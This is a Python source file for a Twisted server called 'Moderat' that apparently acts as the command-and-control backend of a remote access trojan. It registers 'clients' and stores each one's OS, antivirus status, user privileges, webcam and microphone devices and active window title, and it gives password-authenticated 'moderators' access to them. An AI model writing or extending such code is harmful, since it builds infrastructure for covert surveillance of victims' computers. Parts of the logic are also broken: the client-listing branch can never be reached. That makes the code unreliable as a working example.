from twisted.internet.protocol import Protocol, ServerFactory
from twisted.internet import reactor

from ClientsManagment import ClientsManagment
from ModeratorsManagment import ModeratorsManagment
from ModeratorsSessions import SessionsManagment

import logging
from logging.handlers import RotatingFileHandler
import sys

import string
import random
import ast

LOGFILE = 'server.log'
CLIENTS_PORT = 4434
MODERATORS_PORT = 1313

# Initialize logger
log = logging.getLogger('')
log.setLevel(logging.DEBUG)
format = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")

ch = logging.StreamHandler(sys.stdout)
ch.setFormatter(format)
log.addHandler(ch)

fh = logging.handlers.RotatingFileHandler(LOGFILE, maxBytes=(1048576*5), backupCount=7)
fh.setFormatter(format)
log.addHandler(fh)


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class ModeratServerProtocol(Protocol):

    # New Connection Made
    def connectionMade(self):
        self.send_message_to_client(self, 'connectSuccess', 'welcome')

    def connectionLost(self, reason):
        self.factory.clients = {key: value for key, value in self.factory.clients.items() if value is not self}

    def dataReceived(self, data):
        # Data Received
        command = self.recieve_message(data)
        # Switch to client commands
        if command['from'] == 'client':
            self.client_commands(command['payload'], command['mode'])
        # Switch to moderator commands
        elif command['from'] == 'moderator':
            self.moderator_commands(command)

    def client_commands(self, payload, mode):

        # Clients Initializing
        if mode == 'clientInitializing':

            # If client has no key generate new one and send
            if payload == 'noKey':
                client_id = id_generator()

                self.send_message_to_client(self, client_id, 'clientInitializing')

            # else get key from client
            else:
                client_id = payload
                self.send_message_to_client(self, client_id, 'clientInitializing')
            self.factory.clients[payload] = {
                'id': client_id,
                'sock': self,
            }
            log.info('[*] New Client from %s' % self.transport.getHost())

            # Create Client DB Entry
            self.factory.ManageClients.create_client('admin', client_id, self.transport.getHost().host)
            self.factory.ManageClients.set_client_online(client_id)

        # Clients Status Checker
        elif mode == 'infoChecker':
            if self.factory.clients.has_key(payload['key']):
                self.factory.clients[payload['key']] = {
                    'ip_address':           self.transport.getHost().host,
                    'ostype':               payload['os_type'],
                    'os':                   payload['os'],
                    'protection':           payload['protection'],
                    'user':                 payload['user'],
                    'privileges':           payload['privileges'],
                    'inputdevice':          payload['audio_device'],
                    'webcamdevice':         payload['webcamera_device'],
                    'activewindowtitle':    payload['window_title'],
                    'keypassword':          payload['key'],
                }
            else:
                pass

    def moderator_commands(self, data):

        if data['mode'] == 'moderatorInitializing':

            # Initializing Moderator
            log.info('Initializing Moderator')
            if data['payload'].startswith('auth '):
                if len(data['payload'].split()) == 3:
                    command, username, password = data['payload'].split()

                    # If Login Success
                    if self.factory.ManageModerators.login_user(username, password):

                        privileges = self.factory.ManageModerators.get_privs(username)

                        log.info('Moderator (%s) Login Success' % username)
                        self.send_message_to_moderator(self, 'loginSuccess %s' % privileges, 'moderatorInitializing')

                        # Create Session For Moderator and Save
                        log.info('Create Session for Moderator (%s)' % data['session_id'])
                        self.factory.moderators[data['session_id']] = {'username': username}

                    # if Login Not Success
                    else:
                        log.warning('Moderator (%s) Login Error' % username)
                        self.send_message_to_moderator(self, 'loginError', 'moderatorInitializing')

            elif data['mode'] == 'getClients':
                log.info('Get Clients For (%s)' % self.factory.moderators[data['session_id']]['username'])
                if self.factory.moderators[data['session_id']] == data['session_id']:
                    clients = self.factory.ManageClients.get_clients(self.factory.moderators[data['session_id']]['username'])
                    print clients


    def recieve_message(self, data, end='[ENDOFMESSAGE]'):
        return ast.literal_eval(data[:-len(end)].decode('utf-8'))

    def send_message_to_client(self, client, message, mode, _from='server', end='[ENDOFMESSAGE]'):
        # Send Data Function
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'to': '',
        }
        client.transport.write(str(message)+end)

    def send_message_to_moderator(self, moderator, message, mode, _from='server', end='[ENDOFMESSAGE]'):
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'to': '',
        }
        moderator.transport.write(str(message)+end)


class ModeratServerFactory(ServerFactory):

    log.info('Moderat Server Started')

    protocol = ModeratServerProtocol

    ManageClients = ClientsManagment()
    ManageModerators = ModeratorsManagment()
    ManageSessions = SessionsManagment()

    def __init__(self):
        self.clients = {}
        self.moderators = {}


reactor.listenTCP(CLIENTS_PORT, ModeratServerFactory())
log.info('Set Clients Port to %s' % str(CLIENTS_PORT))
reactor.listenTCP(MODERATORS_PORT, ModeratServerFactory())
log.info('Set Moderators Port to %s' % str(MODERATORS_PORT))
reactor.run()